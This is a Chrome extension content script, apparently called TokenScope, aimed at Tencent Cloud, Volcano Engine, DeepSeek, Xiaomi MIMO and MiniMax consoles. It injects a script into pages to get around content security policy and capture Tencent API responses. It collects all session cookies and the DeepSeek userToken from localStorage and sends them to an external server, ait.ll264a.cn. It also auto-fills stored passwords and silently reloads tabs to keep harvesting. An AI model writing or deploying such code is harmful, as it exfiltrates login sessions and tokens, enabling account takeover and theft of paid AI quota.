// TokenScope Chrome 插件 - 自动检测 + 自动填登录 + 自动采集推送

// ============ 注入主世界 CAPI 拦截（通过 chrome-extension:// URL 绕过 CSP） ============
(function() {
  if (!window.location.hostname.includes('tencent.com')) return;
  const s = document.createElement('script');
  s.src = chrome.runtime.getURL('inject.js');
  s.onload = function() { s.remove(); };
  (document.head || document.documentElement).appendChild(s);
})();

const API_BASE = 'https://ait.ll264a.cn';

function sendMsg(msg, timeoutMs) {
  timeoutMs = timeoutMs || 15000;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => resolve({ error: '响应超时' }), timeoutMs);
    chrome.runtime.sendMessage(msg, (resp) => {
      clearTimeout(timer);
      resolve(chrome.runtime.lastError ? { error: chrome.runtime.lastError.message } : resp);
    });
  });
}

(async () => {
  let platforms;
  try {
    const resp = await fetch(API_BASE + '/api/platforms');
    platforms = await resp.json();
  } catch (e) {
    platforms = [
      { id: 'tencent', name: '腾讯云', url: 'https://console.cloud.tencent.com/tokenhub/codingplan', domains: ['.cloud.tencent.com', '.tencent.com'] },
      { id: 'volcano', name: '火山引擎', url: 'https://console.volcengine.com/ark/region:ark+cn-beijing/plan', domains: ['.volcengine.com'] },
      { id: 'deepseek', name: 'DeepSeek', url: 'https://platform.deepseek.com/usage', domains: ['.deepseek.com'] },
      { id: 'xiaomi', name: '小米 MIMO', url: 'https://platform.xiaomimimo.com/console/plan-manage', domains: ['.xiaomimimo.com'] },
      { id: 'minimax', name: 'MiniMax', url: 'https://platform.minimaxi.com/', domains: ['.minimaxi.com', 'platform.minimaxi.com'] },
    ];
  }

  const hostname = window.location.hostname;
  let matched = null;
  for (const p of platforms) {
    for (const domain of p.domains) {
      const clean = domain.startsWith('.') ? domain.slice(1) : domain;
      if (hostname === clean || hostname.endsWith('.' + clean)) {
        matched = { id: p.id, domain: domain };
        break;
      }
    }
    if (matched) break;
  }
  if (!matched) return;

  const platformId = matched.id;
  const cookieDomain = matched.domain;

  // 腾讯云：仅 codingplan 页面才执行（不影响其他页面使用腾讯云）
  if (platformId === 'tencent' && !window.location.href.startsWith('https://console.cloud.tencent.com/tokenhub/codingplan')) {
    return;
  }

  // 腾讯云：CAPI 拦截 + 自动定时刷新（保持数据新鲜）
  if (platformId === 'tencent') {
    console.log('[TokenScope] 等待 CAPI...');
    showBadge('⏳ 采集 CAPI 数据中...', true, { borderColor: '#059669', color: '#4ade80' });

    let capiReceived = false;
    window.addEventListener('message', async function handler(event) {
      if (event.source !== window) return;
      if (event.data && event.data.type === '__ts_capi') {
        capiReceived = true;
        const allData = event.data.all || [];
        const cmds = allData.map(d => d.cmd).join(', ');
        console.log('[TokenScope] CAPI:', cmds);
        // 直接从 content.js 推送（不走 background service worker）
        try {
          const pushResp = await fetch(API_BASE + '/receive.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Token': 'tm_2026_change_me' },
            body: JSON.stringify({
              type: 'capi_data',
              payload: { all: allData, platform: 'tencent' },
            }),
          });
          const pushData = await pushResp.json();
          if (pushResp.ok && pushData.status === 'ok') {
            showBadge('✅ ' + allData.length + ' API 已推送', true, { borderColor: '#059669', color: '#4ade80' });
          } else {
            showBadge('❌ 推送失败: ' + (pushData.error || ''), true, { borderColor: '#b91c1c', color: '#ef4444' });
          }
        } catch(e) {
          showBadge('❌ 推送失败: ' + e.message, true, { borderColor: '#b91c1c', color: '#ef4444' });
        }
        window.removeEventListener('message', handler);
      }
    });

    // 超时检测：15秒无 CAPI 说明未登录/过期
    setTimeout(() => {
      if (!capiReceived) {
        showBadge('❌ CAPI 超时，请重新登录腾讯云', true, { borderColor: '#b91c1c', color: '#ef4444' });
      }
    }, 15000);

    // 每 30 秒自动刷新一次（仅页面在后台时刷新，不影响前台使用）
    setInterval(function() {
      if (document.hidden) {
        console.log('[TokenScope] 30s 后台刷新...');
        location.reload();
      }
    }, 30000);

    // 旧版后备兼容（某些情况 postMessage 可能丢旧版 pkgs 格式）
    let cTid = setInterval(() => {
      try {
        const el = document.getElementById('__tc_capi_out');
        if (el && el.getAttribute('data-cap') && !capiReceived) {
          capiReceived = true; clearInterval(cTid);
          const data = JSON.parse(el.textContent || '{}');
          const pkgs = data.pkgs || [];
          if (pkgs.length > 0) {
            console.log('[TokenScope] CAPI via DOM:', pkgs.length, 'pkg');
            showBadge('✅ ' + pkgs.length + '套餐已推送', true, { borderColor: '#059669', color: '#4ade80' });
            sendMsg({ action: 'push_capi_data', data: { all: [{cmd:'DescribePkg', data:{PkgList:pkgs}}] } });
          }
        }
        if (capiReceived) clearInterval(cTid);
      } catch(e) {}
    }, 1000);
    return;
  }

  // 其他平台：同一会话只采集一次
  // 其他平台：同一会话只采集一次
  let otherOnce = await chrome.storage.session.get('ts_done_' + platformId);
  if (otherOnce['ts_done_' + platformId]) {
    console.log('[TokenScope] ' + platformId + ' 已采集过，跳过');
    return;
  }

  let checkInterval = null;
  const startTime = Date.now();
  const TIMEOUT = 10 * 60 * 1000;
  let initialCookies = 0;

  function showBadge(text, permanent, style) {
    // DOM 未就绪时跳过，等下次调用
    if (!document.body) { setTimeout(() => showBadge(text, permanent, style), 100); return; }
    let badge = document.getElementById('tokenscope-badge');
    if (!badge) {
      badge = document.createElement('div');
      badge.id = 'tokenscope-badge';
      Object.assign(badge.style, {
        position: 'fixed', top: '12px', right: '12px', zIndex: '2147483647',
        background: '#0f172a', padding: '10px 16px', borderRadius: '8px',
        fontSize: '13px', fontWeight: '600',
        fontFamily: '-apple-system, BlinkMacSystemFont, sans-serif',
        border: '1px solid #334155',
        boxShadow: '0 4px 12px rgba(0,0,0,0.4)',
      });
      document.body.appendChild(badge);
    }
    badge.textContent = text || '';
    if (style?.borderColor) badge.style.borderColor = style.borderColor;
    if (style?.color) badge.style.color = style.color;
    badge.style.display = 'block';
    if (!permanent) setTimeout(() => badge.style.display = 'none', 8000);
  }

  async function collectAndPush() {
    showBadge('🔭 采集中...', true, { borderColor: '#059669', color: '#4ade80' });
    await new Promise(r => setTimeout(r, 1000));

    const collectResp = await sendMsg({ action: 'collect', platform: platformId, domain: cookieDomain });
    console.log('[TokenScope] collect:', collectResp);
    if (!collectResp || collectResp.status !== 'ok' || !collectResp.netscape) {
      showBadge('❌ 采集失败: ' + (collectResp?.error || '无 Cookie'), true, { borderColor: '#b91c1c', color: '#ef4444' });
      return;
    }

    const pushResp = await sendMsg({ action: 'push', platform: platformId, netscape: collectResp.netscape });
    console.log('[TokenScope] push:', pushResp);
    if (!pushResp || !pushResp.success) {
      showBadge('❌ 推送失败: ' + (pushResp?.error || ''), true, { borderColor: '#b91c1c', color: '#ef4444' });
      return;
    }

    showBadge('✅ ' + collectResp.count + '个 Cookie 已推送', true, { borderColor: '#059669', color: '#4ade80' });
    await sendMsg({ action: 'clear_login_cred', platform: platformId });

    if (platformId === 'deepseek') {
      try {
        const userToken = localStorage.getItem('userToken');
        if (userToken && userToken.length > 20) {
          const tokenResp = await sendMsg({ action: 'push_token', platform: 'deepseek', token: userToken });
          if (tokenResp?.success) showBadge('✅ userToken 已推送', false, { borderColor: '#059669', color: '#4ade80' });
        }
      } catch(e) { console.log('TokenScope: DS token err', e); }
    }
    // 标记会话完成
    chrome.storage.session.set({ ['ts_done_' + platformId]: true });
  }

  async function checkLoop() {
    if (Date.now() - startTime > TIMEOUT) {
      showBadge('⏰ 超时', true, { borderColor: '#b91c1c', color: '#ef4444' });
      if (checkInterval) clearInterval(checkInterval);
      return;
    }
    const resp = await sendMsg({ action: 'count_cookies', domain: cookieDomain, platform: platformId });
    const n = resp?.count || 0;
    const urlOk = !/login|sign/i.test(window.location.href);
    if (n > initialCookies + 2 || (n > 3 && urlOk)) {
      if (checkInterval) clearInterval(checkInterval);
      await collectAndPush();
    }
  }

  function waitForLogin() {
    sendMsg({ action: 'count_cookies', domain: cookieDomain, platform: platformId }).then(r => { initialCookies = r?.count || 0; });
    setTimeout(() => { checkInterval = setInterval(checkLoop, 2000); checkLoop(); }, 5000);
  }

  // ============ 主流程 ============
  console.log('[TokenScope] 开始, domain=' + cookieDomain);
  const countResp = await sendMsg({ action: 'count_cookies', domain: cookieDomain, platform: platformId });
  const cookieCount = countResp?.count || 0;
  console.log('[TokenScope] cookies:', cookieCount);

  if (cookieCount > 3) {
    showBadge('🔭 ' + cookieCount + ' cookies', true, { borderColor: '#059669', color: '#4ade80' });
    await collectAndPush();
    return;
  }

  console.log('[TokenScope] wait login...');
  showBadge('⏳ 请登录 (' + cookieCount + 'c)', true, { borderColor: '#d97706', color: '#f59e0b' });
  const saved = await sendMsg({ action: 'get_login_cred', platform: platformId });
  if (!saved || !saved.password) { waitForLogin(); return; }

  // 自动填登录
  const { account, password } = saved;
  showBadge('🔭 自动填...');
  await new Promise(r => setTimeout(r, 2000));

  const pwField = document.querySelector('input[type="password"]');
  if (!pwField) {
    const r2 = await sendMsg({ action: 'count_cookies', domain: cookieDomain, platform: platformId });
    if (r2?.count > 5) {
      const checkResp2 = await sendMsg({ action: 'has_auth_cookies', domain: cookieDomain, platform: platformId });
      if (checkResp2?.authenticated) { await collectAndPush(); return; }
    }
    showBadge('⚠️ 无登录表单');
    waitForLogin();
    return;
  }

  let acctField = null;
  for (const inp of document.querySelectorAll('input:not([type="hidden"]):not([type="password"])')) {
    const t = (inp.type || 'text').toLowerCase();
    if (['text','email','tel','number'].includes(t)) { acctField = inp; break; }
  }

  let submitBtn = null;
  const forms = pwField.closest('form');
  if (forms) {
    submitBtn = forms.querySelector('button[type="submit"], button.btn-primary, button:not([type="button"])');
    if (!submitBtn) forms.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });
  }
  if (!submitBtn) document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });

  if (account && acctField) { acctField.value = account; acctField.dispatchEvent(new Event('input', { bubbles: true })); acctField.dispatchEvent(new Event('change', { bubbles: true })); }
  pwField.value = password;
  pwField.dispatchEvent(new Event('input', { bubbles: true }));
  pwField.dispatchEvent(new Event('change', { bubbles: true }));

  showBadge('🔐 已填入', false, { borderColor: '#059669', color: '#4ade80' });
  if (submitBtn) { setTimeout(() => { submitBtn.click(); }, 800); }
  else { showBadge('✋ 手动登录', true, { borderColor: '#d97706', color: '#f59e0b' }); }
  waitForLogin();
})();
